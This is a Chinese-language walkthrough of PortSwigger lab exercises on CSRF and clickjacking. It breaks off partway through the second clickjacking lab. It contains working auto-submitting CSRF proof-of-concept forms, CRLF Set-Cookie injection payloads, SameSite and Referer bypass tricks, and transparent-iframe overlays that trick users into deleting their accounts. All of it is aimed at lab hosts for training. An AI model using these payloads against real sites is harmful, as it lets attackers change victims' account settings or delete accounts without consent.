# CSRF

https://blog.csdn.net/qq_53079406/article/details/128683865

## Lab1

实验1：无防御的CSRF漏洞

```
Lab: CSRF vulnerability with no defenses
APPRENTICE

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter
```

```
实验1：无防御的CSRF漏洞
信息：

本实验的电子邮件更改功能易受CSRF攻击。

完成实验：编制HTML，使用CSRF攻击更改查看者的电子邮件地址并将其上载到漏洞利用服务器

已有账号：wiener:peter
```

### 步骤

登录帐户，提交“更新电子邮件”表单，这里是个更新邮箱的功能点

<img src=".\图片\Snipaste_2023-07-28_10-11-25.png" alt="Snipaste_2023-07-28_10-11-25" style="zoom:67%;" />

利用 burp 自动生成 poc 

<img src=".\图片\Snipaste_2023-07-28_10-14-58.png" alt="Snipaste_2023-07-28_10-14-58" style="zoom:80%;" />

这里记得点 自动提交脚本

<img src=".\图片\Snipaste_2023-07-28_10-25-40.png" alt="Snipaste_2023-07-28_10-25-40" style="zoom:80%;" />

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a1300b504328b3b846c1e1a008c0047.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="123456&#64;123&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

转到漏洞利用服务器，将漏洞利用 HTML 粘贴到 “正文” 部分，然后单击store “存储” 。验证该漏洞是否有效(view exploit “查看漏洞” ），最后 “交付给受害者”

这一步是模拟诱使受害者点击 恶意页面

<img src=".\图片\Snipaste_2023-07-28_10-27-29.png" alt="Snipaste_2023-07-28_10-27-29" style="zoom:80%;" />

于是邮箱被修改为了其它任意邮箱

<img src=".\图片\Snipaste_2023-07-28_10-29-48.png" alt="Snipaste_2023-07-28_10-29-48" style="zoom:80%;" />

## Lab2

实验2：令牌验证取决于请求方法的CSRF

```
Lab: CSRF where token validation depends on request method
PRACTITIONER

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter
```

```
信息：

本实验的电子邮件更改功能易受CSRF攻击。尝试阻止CSRF攻击，但仅对某些类型的请求应用防御。

解决实验：使用漏洞攻击服务器托管一个HTML页面，该页面使用CSRF攻击来更改查看者的电子邮件地址

已有账号：wiener:peter
```

### 前置

#### 1、CSRF令牌

1、CSRF令牌是由服务器端应用程序生成并与客户端共享的唯一、秘密且不可预测的值。发出执行敏感操作（如提交表单）的请求时，客户端必须包含正确的CSRF令牌。否则，服务器将拒绝执行请求的操作。

````
1、与客户端共享CSRF令牌的常见方法是将它们作为隐藏参数包含在HTML表单中，例如：

```
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

2、提交此表单将导致以下请求：

```
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

如果正确实现，CSRF令牌会使攻击者难以代表受害者构造有效请求，从而有助于防御CSRF攻击。由于攻击者无法预测CSRF令牌的正确值，因此无法将其包含在恶意请求中。 
````

2、CSRF令牌不必作为隐藏参数在后请求。如一些应用程序将CSRF令牌放在HTTP头中。令牌的传输方式对整个机制的安全性具有重大影响。

3、CSRF令牌验证中的常见缺陷

CSRF令牌的验证取决于请求方法

#### 2、CSRF令牌的验证取决于请求方法

1、当请求使用POST方法时，一些应用程序可以正确地验证令牌，但当使用GET方法时，则跳过验证。

在这种情况下，攻击者可以切换到GET方法来绕过验证并发起CSRF攻击：

```
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

### 步骤

抓包实验，观察修改邮箱的数据包，发现有 post 传递了 csrf 参数，即为令牌，尝试更改请求方式为 GET ，观察验证有无失效

<img src=".\图片\Snipaste_2023-07-28_10-43-48.png" alt="Snipaste_2023-07-28_10-43-48" style="zoom:80%;" />

发现令牌失效，邮箱被我们修改成了 `12345@123.com`  ，于是故技重施，使用 burp 生成 csrf 的 poc ，发给漏洞利用服务器（这里模拟受害者触发了我们的链接）

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a7f004304d5cd61805d03cf00d10012.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="123456&#64;123&#46;com" />
      <input type="hidden" name="csrf" value="j1D4HmVPmhh1C7wvxh53JoA6g6KD0qM8" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

<img src=".\图片\Snipaste_2023-07-28_10-47-48.png" alt="Snipaste_2023-07-28_10-47-48" style="zoom:80%;" />

最后发现邮箱被修改为 `123456@123.com`

## Lab3

3、CSRF令牌的验证取决于令牌是否存在

```
Lab: CSRF where token validation depends on token being present
PRACTITIONER

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter
```

```
信息：

本实验的电子邮件更改功能易受CSRF攻击。

解决实验：使用漏洞攻击服务器托管一个HTML页面，该页面使用CSRF攻击来更改查看者的电子邮件地址

已有账号：wiener:peter
```

### 前置

1、某些应用程序在令牌存在时正确验证令牌，但如果忽略令牌，则跳过验证

```
在这种情况下，攻击者可以删除包含令牌的整个参数（而不仅仅是其值）以绕过验证并发起CSRF攻击：
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
 
email=pwned@evil-user.net
```

### 步骤

将请求发送到Burp Repeater，更改csrf参数的值，则请求被拒绝。完全删除csrf参数请求被接受

<img src=".\图片\Snipaste_2023-07-28_10-58-23.png" alt="Snipaste_2023-07-28_10-58-23" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-07-28_10-58-40.png" alt="Snipaste_2023-07-28_10-58-40" style="zoom:80%;" />

接下来常规步骤如上面几个lab一样

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a1200190387290880c0d019009d006f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="123456&#64;123&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

<img src=".\图片\Snipaste_2023-07-28_11-00-29.png" alt="Snipaste_2023-07-28_11-00-29" style="zoom:80%;" />

## Lab4

4、CSRF令牌未绑定到用户会话

```
Lab: CSRF where token is not tied to user session
PRACTITIONER

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya
```

```
信息：

1、这个实验室的电子邮件更改功能对 CSRF 来说是脆弱的。它使用令牌试图防止 CSRF 攻击，但没有集成到站点的会话处理系统中。

2、解决实验：使用开发服务器托管一个 HTML 页面，该页面使用 CSRF 攻击来改变查看者的电子邮件地址

3、已有账号：

wiener:peter
carlos:montoya
```

### 步骤

1、

首先，这题有两个账号。抓包实验先登录第一个账号，丢包（因为这个令牌一般都是一次性的）并保存第一个 csrf 令牌；再登录第二个账号，把令牌替换成第一个的令牌，发现依然修改邮箱成功。这表明了 CSRF 令牌未绑定到用户 SESSION ，由此可以 csrf 攻击变会成功。

抓包保存了第一个令牌并丢包

```
email=123%40123.com&csrf=i7fMkaugS3Js2OvEWXrplIaFtiaJ9GeZ
```

再次登录第二个用户，触发修改邮箱操作抓包，把令牌修替换为第一个用户的令牌，发现邮箱依然修改成功

<img src=".\图片\Snipaste_2023-07-29_11-05-02.png" alt="Snipaste_2023-07-29_11-05-02" style="zoom:80%;" />

2、解答靶场

创建并托管概念利用验证（CSRF令牌是一次性的，因此需要添加一个新令牌，刷新页面再次请求，就是新的了）

再把 burp 构造的 poc 传到攻击服务器模拟受害用户触发该页面

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a9a009a03e38f4684a755f000640028.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="123456&#64;123&#46;com" />
      <input type="hidden" name="csrf" value="qsXjY0yKKCDVkXDZtrqJaGhvGVgL3yUK" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Lab5

实验5：令牌绑定到非会话cookie的CSRF

```
Lab: CSRF where token is tied to non-session cookie
PRACTITIONER

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya
```

```
信息：

1、本实验的电子邮件更改功能易受CSRF攻击。使用令牌来尝试防止CSRF攻击，但没有完全集成到站点的会话处理系统中。

2、解决实验：使用漏洞攻击服务器托管一个HTML页面，该页面使用CSRF攻击来更改查看者的电子邮件地址

3、已有账号：

wiener:peter

carlos:montoya
```

### 步骤

#### 第一步

登录帐户，提交 "更新电子邮件" 表单，并在 HTTP 代理历史记录中查找生成的请求

将请求发送到 Burp Repeater，并观察更改会话cookie会将您注销，但更改 csrfKey cookie 只会导致CSRF令牌被拒绝。这表明 csrfKey Cookie 可能**没有严格绑定到会话**

<img src=".\图片\Snipaste_2023-07-29_11-21-45.png" alt="Snipaste_2023-07-29_11-21-45" style="zoom:80%;" />

登录到另一个帐户，并发送一个新的更新电子邮件请求到 BP

如果将 csrfKey cookie 和 csrf 参数从第一个帐户交换到第二个帐户，则请求将被接受，这个与上一题的情况类似

#### 第二步

回到原来的浏览器，执行页面的搜索功能，将结果请求发送到 Burp Repeater，观察搜索词是否反映在 Set-Cookie 头中。由于搜索功能没有 CSRF 保护，可以使用它将 cookie 注入受害用户的浏览器。

创建一个利用此漏洞将 csrfKey Cookie 注入受害者浏览器的URL：

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
 
我的是：
/?search=test%0d%0aSet-Cookie:%20csrfKey=Fd6QjwcbUQdCL7MTeEJG1PEXw6zex2su%3b%20SameSite=None
```

将原有的 csrfKey 置空后，通过在 search 中 set-cookie

<img src=".\图片\Snipaste_2023-07-29_11-30-47.png" alt="Snipaste_2023-07-29_11-30-47" style="zoom:80%;" />

创建并托管概念利用验证，确保包含CSRF令牌。应通过电子邮件更改请求创建利用漏洞攻击

替换为以下代码来注入Cookie（需要csrfKey）

```cobol
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
 
 
我的是：
<img src="https://0aee00c5048716398052b22e00920065.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=Fd6QjwcbUQdCL7MTeEJG1PEXw6zex2su%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

#### 第三步

生成插入的poc，将script标签中的内容换为上面的

修改后

```
换完后：
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0aee00c5048716398052b22e00920065.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="333333&#64;qq&#46;com" />
      <input type="hidden" name="csrf" value="wNQEMSiAHey0s5Mb7yMG7YZTWGxtpvQA" />
      <input type="submit" value="Submit request" />
    </form>
        <img src="https://0aee00c5048716398052b22e00920065.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=Fd6QjwcbUQdCL7MTeEJG1PEXw6zex2su%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

再把它放到攻击者利用服务器提交

## Lab6

6、CSRF令牌只是在Cookie中复制

Lab: CSRF where token is duplicated in cookie

```
This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter
```

```
信息：

本实验的电子邮件更改功能易受CSRF攻击。它尝试使用不安全的"双重提交" CSRF预防技术。

完成实验：使用您的漏洞利用服务器托管一个HTML页面，该页面使用CSRF攻击来更改查看者的电子邮件地址

已有账号：wiener:peter
```

### 前置

1、在上述漏洞的另一个变体中，某些应用程序不维护已发出令牌的任何服务器端记录，而是在Cookie和请求参数中复制每个令牌。验证后续请求时，应用程序**只需验证请求参数中提交的令牌是否与Cookie中提交的值匹配**。

```
这有时被称为针对CSRF的“双重提交”防御，因为它易于实现，并且不需要任何服务器端状态：
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
 
csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

在这种情况下，如果网站包含任何Cookie设置功能，攻击者就可以再次执行CSRF攻击。在这里，攻击者不需要获得他们自己的有效令牌。只需发明一个令牌（可能是所需的格式，如果要检查的话），利用cookie设置行为将其cookie放置到受害者的浏览器中，并在CSRF攻击中将其令牌提供给受害者

### 步骤

登录帐户。提交 "更新电子邮件" 表单，并在 HTTP 代理历史记录中查找生成的请求

```http
POST /my-account/change-email HTTP/2
Host: 0a34008503e46e188031211b00cf0077.web-security-academy.net
Cookie: csrf=WQfYVQ6plfFkisnk6YJovTt7ogkMFxCO; session=cDOD69Tv5LvniNayDMegaVSmUH8paOLu
Content-Length: 58
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a34008503e46e188031211b00cf0077.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a34008503e46e188031211b00cf0077.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

email=1234%40123.com&csrf=WQfYVQ6plfFkisnk6YJovTt7ogkMFxCO
```

 将请求发送到 Burp Repeater，并观察到csrf body参数的值只是通过与 csrf cookie 进行比较来验证

（删除任意一个以后都会报400，少参数）

<img src=".\图片\Snipaste_2023-07-29_11-55-44.png" alt="Snipaste_2023-07-29_11-55-44" style="zoom:80%;" />

执行页面搜索功能，将结果请求发送到 Burp Repeater，并观察搜索词是否反映在Set-Cookie报头中。由于搜索功能没有CSRF保护，可以使用它将cookie注入受害用户的浏览器

创建一个URL，利用此漏洞将伪造的csrf Cookie注入受害者的浏览器：

```
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

生成 poc

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a34008503e46e188031211b00cf0077.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="12345&#64;123&#46;com" />
      <input type="hidden" name="csrf" value="WQfYVQ6plfFkisnk6YJovTt7ogkMFxCO" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

按照无防御CSRF漏洞解决方案实验室中所述创建并托管概念利用验证，确保CSRF令牌设置为“假”。应通过电子邮件更改请求创建利用漏洞攻击。

删除`<script>`模块块，并改为以下代码来注入cookie并提交表单：

```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
 
我的是：
<img src="https://0a34008503e46e188031211b00cf0077.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

更改后的 poc 为（注意2处csrf值改为一致，任意值）

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a34008503e46e188031211b00cf0077.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="333333&#64;qq&#46;com" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="hidden" name="" value="" />
      <input type="submit" value="Submit request" />
    </form>
        <img src="https://0a34008503e46e188031211b00cf0077.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

再把它放到攻击者利用服务器提交

## 中场补充知识

### 三、绕过SameSite Cookie限制

#### 1、简述：

1、SameSite是一种浏览器安全机制，用于确定何时将网站的Cookie包含在源自其他网站的请求中。SameSite Cookie限制提供了针对各种跨站点攻击的部分保护，包括CSRF、跨站点泄漏和一些CORS漏洞攻击。 

#### 2、SameSite Cookie的上下文中、网站

在SameSite Cookie限制的上下文中，站点被定义为顶级域（TLD），通常类似于.com或.net，再加上一个附加级别的域名。这通常被称为TLD+1。

在确定请求是否为同一站点时，还考虑URL方案。这意味着从 http://app.example.com 到https://app.example.com的链接被大多数浏览器视为跨站点链接。 
<img src=".\图片\1aed2f6d7d5b40e2be6a738016692371.png" alt="1aed2f6d7d5b40e2be6a738016692371" style="zoom:80%;" />

#### 3、站点和源之间的区别

1、站点和源之间的区别在于它们的范围;一个站点包含多个域名，而一个源只包含一个。尽管它们密切相关，但重要的是不要互换使用这两个术语，因为将两者混为一谈可能会带来严重的安全隐患。

2、如果两个URL共享完全相同的方案、域名和端口，则认为它们具有相同的来源。不过请注意，端口通常是从方案中推断出来的。 
<img src=".\图片\adef16a2f6604f46a16e270d61d9b260.png" alt="adef16a2f6604f46a16e270d61d9b260" style="zoom:67%;" />

3、“站点”一词的具体性要低得多，因为它只说明了方案和域名的最后一部分。至关重要的是，这意味着跨源请求仍然可以是同一站点的，但不是相反

<img src=".\图片\9de9444d22fd422eb49ec0597e7823f3.png" alt="9de9444d22fd422eb49ec0597e7823f3" style="zoom:67%;" />

这是一个重要的区别，因为这意味着任何允许任意JavaScript执行的漏洞都可以被滥用，以绕过属于同一站点的其他域上基于站点的防御

### 3、SameSite工作原理

1、在引入SameSite机制之前，浏览器在每个请求中向发出它们的域发送Cookie，即使请求是由不相关的第三方网站触发的。SameSite的工作原理是使浏览器和网站所有者能够限制哪些跨网站请求（如果有）应包括特定的Cookie。这有助于减少用户遭受CSRF攻击的风险，CSRF攻击会诱使受害者的浏览器发出请求，从而在易受攻击的网站上触发有害操作。由于这些请求通常需要与受害者的身份验证会话关联的Cookie，因此如果浏览器不包含此Cookie，攻击将失败。

2、当前所有主流浏览器都支持SameSite限制级别：严格、松弛、无

3、开发人员可以为他们设置的每个Cookie手动配置限制级别，从而使他们能够更好地控制何时使用这些Cookie。为此只需将 相同站点 中的属性 设置Cookie响应报头及其首选值：

```
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

尽管这提供了一些针对CSRF攻击的保护，但这些限制都不能保证免疫

4、如果发布Cookie的网站没有明确设置SameSite属性，Chrome会默认自动应用Lax（松弛）限制。这意味着Cookie仅在满足特定条件的跨站点请求中发送，即使开发人员从未配置此行为

```
1、严格
 
如果cookie设置为SameSite=Strict属性，浏览器将不会在任何跨站点请求中发送它。简而言之，这意味着如果请求的目标站点与浏览器地址栏中当前显示的站点不匹配，则不会包含Cookie。
 
建议在设置Cookie以使承载者能够修改数据或执行其他敏感操作（例如访问仅对经过身份验证的用户可用的特定页面）时使用此选项。
 
尽管这是最安全的选项，但在需要跨站点功能的情况下，它可能会对用户体验产生负面影响。 
 
  
2、松弛
 
不严格的SameSite限制意味着浏览器将在跨站点请求中发送Cookie，但前提是同时满足以下两个条件：
    请求使用GET方法。
    请求是由用户的顶级导航（如单击链接）产生的。
这意味着Cookie不包括在跨站点 后例如请求。作为 后请求通常用于执行修改数据或状态的操作（至少根据最佳实践），因此它们更有可能成为CSRF攻击的目标。
 
同样，Cookie也不包含在后台请求中，例如由脚本、iframe或对图像和其他资源的引用发起的请求。 
  
 
3、无
 
如果使用SameSite=None属性设置Cookie，则无论使用何种浏览器，都将有效地禁用SameSite限制。因此，浏览器将在所有请求中向发出此cookie的网站发送此cookie，即使是由完全无关的第三方网站触发的请求。
 
除Chrome外，这是主要浏览器的默认行为，如果没有 相同站点属性在设置Cookie时提供。
 
禁用SameSite是有正当理由的，例如，当cookie旨在从第三方上下文使用，并且不授予承载者对任何敏感数据或功能的访问权限时。跟踪cookie就是一个典型的例子。
 
如果遇到设置为SameSite=None或没有显式限制的cookie，则值得调查它是否有用。当Chrome首次采用“默认松弛”行为时，它的副作用是破坏了许多现有的网络功能。作为一个快速的解决方案，一些网站选择简单地禁用所有Cookie上的SameSite限制，包括可能敏感的Cookie。
 
使用设置Cookie时 相同站点=无 ，网站还必须包括 安全属性，该属性确保仅通过HTTPS在加密消息中发送Cookie。否则，浏览器将拒绝Cookie，并且不会设置Cookie。
Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
```

### 4、使用GET请求绕过SameSite Lax限制

1、服务器并不总是挑剔它们是否收到 获取 或 后请求到给定端点，甚至是那些期望表单提交的端点。如果还使用 松弛 的会话cookie限制，无论是显式限制还是浏览器默认设置限制，仍然可以执行 CSRF攻击 通过引出 获取从受害者的浏览器发出的请求。

```
只要请求涉及顶级导航，浏览器仍将包含受害者的会话cookie。以下是发起此类攻击的最简单方法之一：
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

即使不允许普通的GET请求，一些框架也提供了重写请求行中指定的方法的方法。

```
例如，Symfony支持表单中的_method参数，该参数优先于用于路由目的的普通方法：
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

### 四、绕过基于引用的CSRF防御

#### 1、简述：

除了使用CSRF令牌的防御之外，一些应用程序还利用HTTP Referer报头来尝试防御CSRF攻击，通常是通过验证请求是否来自应用程序自己的域。这种方法通常效果不佳，而且常常被绕过。

#### 2、引用方的验证取决于是否存在标头

1、某些应用程序验证Referer标头（当它出现在请求中时），但如果标头被省略，则跳过验证。

在这种情况下，攻击者可以创建其 CSRF漏洞利用 导致受害用户的浏览器删除Referer标题在结果请求中。

```
有多种方法可以实现这一点，但最简单的方法是在承载 CSRF攻击：
<meta name="referrer" content="never">
```

#### 3、可以绕过引用方的验证

1、某些应用程序验证Referer报头以一种可以被绕过的简单方式。

```
1、如应用程序验证Referer以预期值开始，则攻击者可以将其作为自己域的子域：
http://vulnerable-website.com.attacker-website.com/csrf-attack
 
2、如果应用程序只是验证Referer包含其自己的域名，则攻击者可以将所需的值放在URL中的其他位置：
http://attacker-website.com/csrf-attack?vulnerable-website.com
```

2、尽管可以使用Burp来识别这种行为，但是当在浏览器中测试概念证明时，经常会发现这种方法不再起作用。为了降低敏感数据以这种方式泄漏的风险，许多浏览器现在将查询字符串从Referer标头

3、可以通过确保包含利用漏洞攻击的响应具有Referrer-Policy: unsafe-ur标题集。这样可以确保发送完整的URL，包括查询字符串。

# Clickjacking

## 简述

1、原理：点击劫持是一种基于界面的攻击，用户通过点击诱饵网站中的一些其他内容，被诱骗点击隐藏网站上的可操作内容。

2、示例：

一个网络用户访问一个诱骗网站（也许这是一个由电子邮件提供的链接）并点击一个按钮来赢得奖品。在不知不觉中，他们被攻击者欺骗，按下了另一个隐藏按钮，这导致了另一个网站上的帐户付款。这是一个点击劫持攻击的例子。该技术依赖于合并一个不可见的、可操作的网页（或多个网页），其中包含一个按钮或隐藏链接，比如说，在iframe中。iframe覆盖在用户预期的诱饵网页内容之上。

（此攻击与 CSRF攻击的不同之处在于，用户需要执行按钮单击等操作，而CSRF攻击依赖于在用户不知情或不输入的情况下伪造整个请求）
3、阻碍：防止CSRF攻击通常是通过使用CSRF令牌来提供的：特定于会话的、单次使用的数字或随机数。CSRF令牌无法减轻点击劫持攻击，因为目标会话是使用从可信网站加载的内容建立的，并且所有请求都发生在域中。CSRF令牌被放入请求中，并作为正常行为会话的一部分传递给服务器。与普通用户会话相比，不同之处在于该进程发生在隐藏的iframe中。

## Lab1

### 前置

构造基本的点击劫持攻击：

1、点击劫持攻击使用CSS来创建和操作层。攻击者将目标网站合并为覆盖在诱饵网站上的iframe层

```html
使用style标记和参数的示例如下：
<head>
    <style>
        #target_website {
            position:relative;
            width:128px;
            height:128px;
            opacity:0.00001;
            z-index:2;
            }
        #decoy_website {
            position:absolute;
            width:300px;
            height:400px;
            z-index:1;
            }
    </style>
</head>
...
<body>
    <div id="decoy_website">
    ...decoy web content here...
    </div>
    <iframe id="target_website" src="https://vulnerable-website.com">
    </iframe>
</body>
```

2、解释：目标网站iframe被定位在浏览器内，使得使用适当的宽度和高度位置值存在目标动作与诱饵网站的精确重叠。绝对和相对位置值用于确保目标网站准确地与诱饵重叠，而与屏幕大小、浏览器类型和平台无关。z-index决定iframe和website层的堆叠顺序。opacity值定义为0.0（或接近0.0），以便iframe内容对用户透明。浏览器点击劫持防护可能会应用基于阈值的iframe透明度检测（Chrome版本可能会检测，提倡Firefox）。攻击者选择不透明度值，以便在不触发保护行为的情况下实现所需效果

3、Clickbandit工具

尽管可以如上所述手动创建点击劫持概念证明，但这在实践中可能相当乏味和耗时。当测试点击劫持时，使用 **Burp 的 Clickbandit 工具**。这允许使用浏览器在可成帧页面上执行所需的操作，然后创建一个包含合适的点击劫持覆盖层的HTML文件。可以使用它在几秒钟内生成交互式概念验证，而不必编写一行HTML或CSS

### 题目

实验1:带有CSRF令牌保护的基本点击劫持

Lab: Basic [clickjacking](https://portswigger.net/web-security/clickjacking) with [CSRF](https://portswigger.net/web-security/csrf) token protection

```
This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter
```

```
信息：

1、本实验包含登录功能和受CSRF令牌保护的删除帐户按钮。用户将单击诱饵网站上显示单词“click”的元素。

2、解决实验：制作一些HTML来构建帐户页面，并欺骗用户删除他们的帐户

3、已有账号：wiener:peter
```

#### 步骤

登录账号

转到利用漏洞攻击服务器，对模板进行以下调整：

1、将iframe src属性中的YOUR-LAB-ID替换为自己实验室ID
2、用合适的像素值替换iframe的$height_value和$width_value变量（建议分别为700 px和500 px）。
3、用合适的像素值替换诱饵网页内容的$top_value和$side_value变量，以便“删除帐户”按钮和“测试我”诱饵动作对齐（我们建议分别为300 px和60 px）。
4、设置不透明度值$opacity以确保目标iframe是透明的。最初，使用0.1的不透明度，以便可以对齐iframe操作并根据需要调整位置值。对于提交的攻击，值0.0001将起作用。

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
 
我的是：
<style>
iframe {
    position:relative;
    width:500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}
div {
    position:absolute;
    top:500px;
    left:60px;
    z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://0a2900b904fa8fb08b3d419100200074.web-security-academy.net/my-account"></iframe>
```

单击存储，然后单击查看漏洞（view）
将鼠标悬停在click me上，确保光标变为手形，指示div元素已正确定位。(如果div未正确对齐，请调整样式表的top和left属性)

## Lab2

### 前置

使用预填充表单输入的点击劫持

1、一些需要表单完成和提交的网站允许在提交之前使用GET参数预先填充表单输入。其他网站可能要求在提交表单之前输入文本。由于GET值是URL的一部分，因此可以修改目标URL以包含攻击者选择的值，并将透明的“提交”按钮覆盖在诱饵站点上，如基本的点击劫持示例所示

### 题目

Lab: Clickjacking with form input data prefilled from a URL parameter

```
This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter
```

```
信息：

